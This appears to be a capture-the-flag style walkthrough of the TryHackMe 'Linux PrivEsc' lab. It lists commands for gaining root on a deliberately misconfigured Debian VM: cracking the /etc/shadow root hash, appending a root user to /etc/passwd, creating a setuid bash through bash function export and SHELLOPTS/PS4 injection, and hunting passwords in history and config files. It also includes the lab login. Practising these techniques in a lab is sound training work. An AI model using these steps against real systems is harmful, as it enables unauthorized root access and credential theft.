<!-- TOC -->

- [Linux PrivEsc](#linux-privesc)
    - [Weak File Permissions: Readable /etc/shadow](#weak-file-permissions---readable-etcshadow)
    - [Weak File Permissions: Writable /etc/passwd](#weak-file-permissions---writable-etcpasswd)
    - [Sudo: Shell Escape Sequences](#sudo---shell-escape-sequences)
    - [Sudo: Environment Variables](#sudo---environment-variables)
    - [Cron Jobs: PATH Environment Variable](#cron-jobs---path-environment-variable)
    - [SUID / SGID Executables: Shared Object Injection](#suid--sgid-executables---shared-object-injection)
    - [SUID / SGID Executables: Environment Variables](#suid--sgid-executables---environment-variables)
    - [SUID / SGID Executables: Abusing Shell Features #1](#suid--sgid-executables---abusing-shell-features-1)
    - [SUID / SGID Executables: Abusing Shell Features #2](#suid--sgid-executables---abusing-shell-features-2)
    - [Passwords & Keys: History Files](#passwords--keys---history-files)
    - [Passwords & Keys: Config Files](#passwords--keys---config-files)

<!-- /TOC -->

# Linux PrivEsc

[Linux PrivEsc Room](https://tryhackme.com/room/linuxprivesc)

Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321

| Title | IP Address |
| :---- | :---- |
| Linux PrivEsc | `1*.**.*.***` |

## Weak File Permissions: Readable /etc/shadow

```bash
cat /etc/shadow | grep root
```

> `root:$6$T*/****K.**M*OA****B*****TG******IH****OWAI***VITLL*V**X*RDJXET..****.******Z*M**D*B**G*JI*:17298:0:99999:7:::`

LHOST:

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

> `Loaded 1 password hash (s**********, crypt(3) $6$ [SHA512 256/256 AVX2 4x])`

> `p********** (?)`

## Weak File Permissions: Writable /etc/passwd

LHOST:

```bash
openssl passwd password
```

> `Q*****I/C*J*E`

RHOST:

Using `newroot:password`

```bash
echo "newroot:Qj4ktrI/C5JyE:0:0:root:/root:/bin/bash" >> /etc/passwd
su newroot
id
```

> `u**=*(****) ***=*(****) ******=*(****)`

## Sudo: Shell Escape Sequences

```bash
sudo -l
```

## Sudo: Environment Variables

```bash
ldd /usr/sbin/apache2
```

## Cron Jobs: PATH Environment Variable

```bash
cat /etc/crontab
```

> `/****/****:/***/*****/****:/***/*****/***:/****:/***:/***/****:/***/***`

## SUID / SGID Executables: Shared Object Injection

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

## SUID / SGID Executables: Environment Variables

```bash
strings /usr/local/bin/suid-env
```

## SUID / SGID Executables: Abusing Shell Features (#1)

If `bash` versions < `4.2-048`:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

##  SUID / SGID Executables: Abusing Shell Features (#2)

If `bash` version < `4.4`:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

## Passwords & Keys: History Files

```bash
cat ~/.*history | less
```

## Passwords & Keys: Config Files

```bash
cat myvpn.ovpn
cat /etc/o******/****.txt 
```

> `root p**********`
